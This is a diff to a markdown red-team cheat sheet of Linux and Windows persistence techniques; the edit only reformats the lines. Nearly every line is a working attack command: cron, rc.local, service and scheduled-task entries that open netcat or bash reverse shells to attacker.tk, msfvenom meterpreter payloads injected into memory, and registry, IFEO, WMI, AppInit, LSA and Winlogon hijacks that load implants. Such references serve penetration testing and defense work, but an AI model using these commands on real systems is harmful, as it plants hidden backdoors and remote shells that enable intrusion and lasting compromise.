@@ -109,23 +109,23 @@
 
 * Tasks
 
-    bash#> echo "* * * * * bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1" >>/var/spool/cron/root
-    bash#> echo $'SHELL=/bin/bash\n* * * * * root bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1\n'> /etc/cron.d/pwn
+    `bash#> echo "* * * * * bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1" >>/var/spool/cron/root`<br>
+    `bash#> echo $'SHELL=/bin/bash\n* * * * * root bash ‐i >& /dev/tcp/attacker.tk/8888 0>&1\n'> /etc/cron.d/pwn`<br>
 
 * In MEMORY
 
-    msfvenom ‐p linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888 ‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount=999999
-    bash$> inject_linux PID meter32.bin
+    `msfvenom ‐p linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888 ‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount=999999`<br>
+    `bash$> inject_linux PID meter32.bin`
 
 * LD_PRELOAD
 
-    bash#> echo /path/to/meter.so >> /etc/ld.so.preload
-    bash#> echo export LD_PRELOAD=/path/to/meter.so >> /etc/profile
-    bash$> echo export LD_PRELOAD=/path/to/meter.so >> ~/.bashrc
+    `bash#> echo /path/to/meter.so >> /etc/ld.so.preload`<br>
+    `bash#> echo export LD_PRELOAD=/path/to/meter.so >> /etc/profile`<br>
+    `bash$> echo export LD_PRELOAD=/path/to/meter.so >> ~/.bashrc`<br>
 
 * rc.local
 
-    bash#> echo "nc attacker.tk 8888 ‐e /bin/bash &" >> /etc/rc.local
+    `bash#> echo "nc attacker.tk 8888 ‐e /bin/bash &" >> /etc/rc.local`
 
 ## WINDOWS
 
@@ -133,71 +133,69 @@
 
 * Autorun
 
-    cmd$> copy meter.exe %APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
-    cmd$> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\users\username\meter.exe"
-    cmd#> copy meter.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
-    cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\system32\meter.exe"
+    `cmd$> copy meter.exe %APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`<br>
+    `cmd$> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\users\username\meter.exe"`<br>
+    `cmd#> copy meter.exe C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`<br>
+    `cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\system32\meter.exe"`<br>
 
 * Service
 
-    cmd#> sc create persistence binPath= "nc.exe ‐e \windows\system32\cmd.exe attacker.tk 8888" start= auto
-    cmd#> sc failure persistence reset= 0 actions=restart/60000/restart/60000/restart/60000
-    cmd#> sc start persistence
+    `cmd#> sc create persistence binPath= "nc.exe ‐e \windows\system32\cmd.exe attacker.tk 8888" start= auto`<br>
+    `cmd#> sc failure persistence reset= 0 actions=restart/60000/restart/60000/restart/60000`<br>
+    `cmd#> sc start persistence`<br>
 
 * Tasks
 
-    cmd#> at 13:37 \temp\nc.exe ‐e \windows\system32\cmd.exe attacker.tk 8888
-    cmd#> schtasks /create /ru SYSTEM /sc MINUTE /MO 1 /tn persistence /tr "c:\temp\nc.exe ‐e c:\windows\system32\cmd.exe attacker.tk 8888"
+    `cmd#> at 13:37 \temp\nc.exe ‐e \windows\system32\cmd.exe attacker.tk 8888`<br>
+    `cmd#> schtasks /create /ru SYSTEM /sc MINUTE /MO 1 /tn persistence /tr "c:\temp\nc.exe ‐e c:\windows\system32\cmd.exe attacker.tk 8888"`<br>
 
 * In MEMORY
 
-    msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount=999999
-    cmd$> inject_windows.exe PID meter32.bin
+    `msfvenom ‐p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888‐f raw ‐o meter32.bin exitfunc=thread StagerRetryCount=999999`<br>
+    `cmd$> inject_windows.exe PID meter32.bin`<br>
 
 * Debugger
 
-    cmd#> copy calc.exe _calc.exe
-    cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe ‐e c:\windows\system32\cmd.exeattacker.tk 8888" /f
+    `cmd#> copy calc.exe _calc.exe`<br>
+    `cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe ‐e c:\windows\system32\cmd.exeattacker.tk 8888" /f`
 
 * Gflags
 
-    cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD/d 512
-    cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
-    cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc ‐e \windows\system32\cmd.exe attacker.tk 8888"
+    `cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD/d 512`<br>
+    `cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1`<br>
+    `cmd#> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc ‐e \windows\system32\cmd.exe attacker.tk 8888"`
 
 * WMI
 
-    cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilterCREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-    cmd#> wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\users\admin\meter.exe",CommandLineTemplate="C:\users\admin\meter.exe"
-    cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""
+    `cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __EventFilterCREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`<br>
+    `cmd#> wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\users\admin\meter.exe",CommandLineTemplate="C:\users\admin\meter.exe"`<br>
+    `cmd#> wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"", Consumer="CommandLineEventConsumer.Name="persistence""`<br>
 
 * AppInit
 
-    cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
-    cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter64.dll" /f
-    cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
-    cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter32.dll" /f
+    `cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f`<br>
+    `cmd#> reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter64.dll" /f`<br>
+    `cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f`<br>
+    `cmd#> reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter32.dll" /f`<br>
 
 * Lsass
 
-    cmd#> reg add "HKLM\system\currentcontrolset\control\lsa" /v"Notification Packages" /t reg_multi_sz /d "rassfm\0scecli\0meter" /f
+    `cmd#> reg add "HKLM\system\currentcontrolset\control\lsa" /v"Notification Packages" /t reg_multi_sz /d "rassfm\0scecli\0meter" /f`<br>
 
 * Winlogon
 
-    cmd#> reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,c:\windows\meter.exe"
+    `cmd#> reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,c:\windows\meter.exe"`<br>
 
 * Netsh
 
-    cmd#> c:\windows\syswow64\netsh.exenetsh> add helper c:\windows\meter32.dll
-    cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\SysWOW64\netsh.exe"
+    `cmd#> c:\windows\syswow64\netsh.exenetsh> add helper c:\windows\meter32.dll`<br>
+    `cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\SysWOW64\netsh.exe"`
 
 * Office
 
-    cmd$> reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\users\username\meter.dll
+    `cmd$> reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\users\username\meter.dll`
 
-# LINKS
-
-## MANUALS
+# MANUALS
 
 * [Red Team Notes](https://dmcxblue.gitbook.io/red-team-notes-2-0/)
 * [Hacktricks](https://book.hacktricks.xyz/)
